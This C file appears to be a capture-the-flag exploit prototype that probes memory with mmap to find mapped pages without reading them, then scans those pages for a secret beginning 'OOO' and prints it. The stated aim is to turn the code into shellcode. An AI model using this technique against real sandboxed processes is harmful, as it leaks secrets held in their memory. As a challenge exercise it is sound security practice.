#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <asm/errno.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL
void *search(void* ptr);

void *shellcode()
{
    // 1. Find the secret in memory (starts with "OOO:")
    // 2. Print it
    // 3. ...
    // 4. PROFIT!

    printf("Hi! Soon I'll be your shellcode!\n");

    char *ptr = ADDR_MIN ;
    //printf("INITIAL ptr: %p, %p\n", ADDR_MIN, ptr);
    for(int i=0; i<100; i++){
    //for(unsigned long int i=1; i<255*1024*1024; i++){

    	ptr = search(ptr);
	//printf("FOUND ptr: %p, %s\n", ptr, ptr);
	if(*ptr=='O' && *(ptr+1)=='O'){
		printf("%s\n", ptr);
		return ptr;
	}
	ptr += 0x1000UL;
    }
    printf("OH YEAH");

    return (void*) 0x123456; // For this simplified test it's also OK to return the address

}
//search until the first page available
void *binSearch(void *ptr, int *found){
	*found = 0;
	//printf("INITIAL ptr is %p\n", ptr);
	unsigned long int right = 4096*32; //that's the max without failing mmap
	unsigned long int left = 0;
	while(left<=right){
		unsigned long int mid = (right+left)/2;
	       	unsigned long int offset = mid*0x1000UL;
		//test it
		//printf("try mid: %lld, left: %lld, right: %lld\n",
		//		mid, left, right);
		void *r1 = mmap(ptr, offset,
		    PROT_READ|PROT_WRITE,
		    MAP_ANONYMOUS|MAP_PRIVATE ,
		    -1, 0);
		if(r1==ptr){//allocate success, means no page there
			//printf(" -- no page for %lld\n", mid);
			left = mid;
			munmap(ptr, offset);
		}else{//allocate failure, means there is some page
			//printf(" -- there IS page for %lld\n", mid);
			right = mid;
			munmap(r1, offset);
		}
		if(left==right-1){
			//try 3 times
			for(unsigned long int i=left; i<left+3; i++){
				//printf("try i %d\n", i);
				void *ret = ptr+ 0x1000UL*i;
				void *r2 = mmap(ret, 4096,
				    PROT_READ|PROT_WRITE,
				    MAP_ANONYMOUS|MAP_PRIVATE ,
				    -1, 0);
				if(r2==ret){
					//printf("not found!\n");
					munmap(ret, 4096);
				}else{
					//printf("found it ptr: %p!\n", ret);
					//printf("p: %p, %s\n", ret,  ret);
					*found = 1;
					munmap(r2, 4096);
					return ret;
				}
			}
			return ptr+mid*0x1000L;
		}

	}
	return 0x0;
}

long total = 0;
void *search(void *ptr){
	int found = 0;
	int i = 0;
	while(found==0){
		i++;
		//printf("%d'th search ...\n", i);
		ptr = binSearch(ptr, &found);
	}
	total += i;
	printf("total search: %d\n", total);
	return ptr;
}
